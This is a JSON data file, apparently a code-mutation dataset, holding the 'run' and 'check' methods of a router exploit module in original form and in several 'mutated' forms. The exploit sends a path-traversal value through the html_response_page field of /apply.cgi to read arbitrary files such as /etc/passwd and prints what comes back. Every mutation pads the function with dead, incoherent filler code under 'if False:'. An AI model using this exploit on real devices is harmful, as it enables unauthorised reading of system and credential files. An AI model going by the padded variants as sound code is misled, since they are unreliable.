[
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.check():\n        print_success('Target seems to be vulnerable')\n        file_path = '..{}'.format(self.filename)\n        data = {'html_response_page': file_path, 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n        print_status('Sending request payload using credentials: {} / {}'.format(self.username, self.password))\n        response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n        if response is None:\n            return\n        if response.status_code == 200:\n            print_status('File: {}'.format(self.filename))\n            print_info(response.text)\n        else:\n            print_error('Exploit failed - could not read response')\n    else:\n        print_error('Exploit failed - target seems to be not vulnerable')"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    data = {'html_response_page': '/etc/passwd', 'action': 'do_graph_auth', 'login_name': 'test', 'login_pass': 'test1', '&login_n': 'test2', 'log_pass': 'test3', 'graph_code': '63778', 'session_id': 'test5', 'test': 'test'}\n    response = self.http_request(method='POST', path='/apply.cgi', data=data, auth=(self.username, self.password))\n    if response is None:\n        return False\n    if utils.detect_file_content(response.text, '/etc/passwd'):\n        return True\n    return False"
        ]
    }
]